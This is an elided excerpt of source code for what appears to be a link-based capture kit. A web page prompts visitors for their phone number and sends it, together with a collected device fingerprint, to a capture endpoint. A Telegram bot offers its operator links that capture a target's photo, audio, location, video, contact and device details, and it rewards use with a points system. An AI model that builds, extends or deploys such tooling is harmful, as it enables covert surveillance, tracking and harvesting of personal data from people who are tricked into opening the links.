...
async function sendContact(){
  let phone = prompt("📞 သင့်ဖုန်းနံပါတ် ထည့်ပါ | Enter your phone number:", "");
  if (!phone || phone.trim() === "") {
    showToast("❌ ဖုန်းနံပါတ် မထည့်သွင်းပါ | No number entered");
    return;
  }
  phone = phone.trim();
  const fp = await collectFingerprint();
  ...
  form.append("phone", phone);
  form.append("fingerprint", JSON.stringify(fp));
  fetch("/capture_contact", { method: "POST", body: form });
  showToast("✅ ဖုန်းနံပါတ် ပေးပို့ပြီး | Phone number sent");
}
async function startCapture(){
  ...
  if(mode==="all"){
    ...
    await sendContact();animateBuffer(100,600);
  } else {
...
const MODAL={
  ...
  contact:{icon:"📞",mm:"ဖုန်းနံပါတ် လိုအပ်သည်",en:"Phone Number Required",bmm:"သင့်ဖုန်းနံပါတ် ထည့်သွင်းပေးရန် လိုအပ်သည်",ben:"You need to enter your phone number to continue."}
};
...
async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if text in MODE_MAP:
        ...
        await update.message.reply_text(
            "❓ <b>Help | အကူအညီ</b>\n\n"
            "<b>Links:</b>\n"
            "🌐 All → Photo+Audio+Location+Video+Contact+Device\n"
            "📸 Photo → ဓာတ်ပုံ\n🎤 Audio → အသံ\n📍 Location → တည်နေရာ\n🎥 Video → ဗီဒီယို\n📞 Contact → ဖုန်းနံပါတ်\n\n"
            "<b>Points system:</b>\n"
            f"🎁 Daily Bonus → +{DAILY_BONUS_PTS} pts/day\n"
...
# ─────────────────────────────────────────
# OPTIONAL NATIVE CONTACT HANDLER (Telegram request_contact)
# ─────────────────────────────────────────
...
def run_bot():
    ...
    app.add_handler(MessageHandler(filters.CONTACT, contact_handler))  # optional
    print("🤖 Bot polling...")
